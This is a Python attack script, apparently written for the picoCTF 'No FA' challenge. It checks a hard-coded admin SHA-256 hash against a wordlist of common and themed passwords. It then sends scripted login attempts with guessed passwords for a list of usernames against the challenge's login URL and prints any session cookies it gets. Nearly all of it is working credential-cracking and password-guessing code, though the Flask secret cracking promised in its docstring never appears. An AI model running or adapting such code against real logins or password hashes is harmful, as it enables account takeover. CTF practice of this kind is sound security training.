"""Crack admin SHA-256 password and Flask session secret for No FA challenge."""
import hashlib
import urllib.request
import urllib.parse
import http.cookiejar
import time

TARGET_HASH = "c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67"
LOGIN_URL = "http://foggy-cliff.picoctf.net:63365/login"
HOME_URL = "http://foggy-cliff.picoctf.net:63365/"

# Extended common password list
passwords = [
    # Top common
    "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
    "letmein", "trustno1", "dragon", "baseball", "iloveyou", "master", "sunshine",
    "ashley", "bailey", "passw0rd", "shadow", "123123", "654321", "superman",
    "qazwsx", "michael", "football", "password1", "password123", "batman",
    # Admin-related
    "admin", "admin123", "admin1234", "admin12345", "admin!@#", "administrator",
    "root", "toor", "superadmin", "Admin", "Admin123", "ADMIN", "iamadmin",
    "admin@nfs", "admin@nfs.com", "iamadmin@nfs.com", "nfs", "nfa", "picoctf",
    "flag", "ctf", "secret", "changeme", "welcome", "test", "guest",
    # With numbers
    "admin1", "admin2", "admin2024", "admin2025", "admin2026", "admin!",
    "Admin@123", "Admin@1234", "P@ssw0rd", "Passw0rd", "Password1", "Password123",
    # picoCTF themed
    "pico", "picoctf", "picoCTF", "p1c0", "h4ck", "hacker", "capture", "theflag",
    # Two FA themed
    "no2fa", "no2fa!", "no_fa", "no-fa", "nofa", "twofa", "2fa", "otp", "bypass",
    # Hashcat common
    "1234", "12345", "123456789", "1234567890", "0000", "1111", "password0",
]

print(f"[*] Trying {len(passwords)} passwords against admin hash...")
for p in passwords:
    h = hashlib.sha256(p.encode()).hexdigest()
    if h == TARGET_HASH:
        print(f"[+] ADMIN PASSWORD CRACKED: {p}")
        break
else:
    print("[-] Not found in wordlist")

# Also try to log in as non-2FA users to get a valid session
print("\n[*] Trying to log in as non-2FA users...")
non_2fa_users = [
    "john.doe", "jane.smith", "robert.jones", "emily.brown", "michael.davis",
    "linda.wilson", "david.garcia", "jennifer.rodriguez", "christopher.williams",
    "angela.martinez", "kevin.anderson", "melissa.thomas", "brian.jackson",
    "stephanie.white", "eric.harris", "michelle.martin", "patrick.thompson",
    "nicole.garrett", "joseph.cole"
]

# Try common passwords for each user
for user in non_2fa_users[:5]:  # First 5 only for speed
    for p in ["password", "password123", "123456", user, user.replace(".", ""), user.replace(".", "_")]:
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        data = urllib.parse.urlencode({"username": user, "password": p}).encode()
        req = urllib.request.Request(LOGIN_URL, data=data, method="POST")
        try:
            resp = opener.open(req, timeout=5)
            # If we get here without redirect to login, we might be logged in
            body = resp.read().decode("utf-8", errors="replace")
            if "Welcome" in body or "flag" in body.lower() or "logout" in body.lower():
                print(f"  [+] {user}:{p} -> logged in!")
                for c in cj:
                    print(f"      Cookie: {c.name}={c.value[:50]}...")
                break
        except urllib.error.HTTPError as e:
            if e.code == 302:
                loc = e.headers.get("Location", "")
                if "home" in loc or "2fa" not in loc:
                    print(f"  [+] {user}:{p} -> redirect to {loc}")
                    for c in cj:
                        print(f"      Cookie: {c.name}={c.value[:50]}...")
                    break
        except Exception as e:
            pass
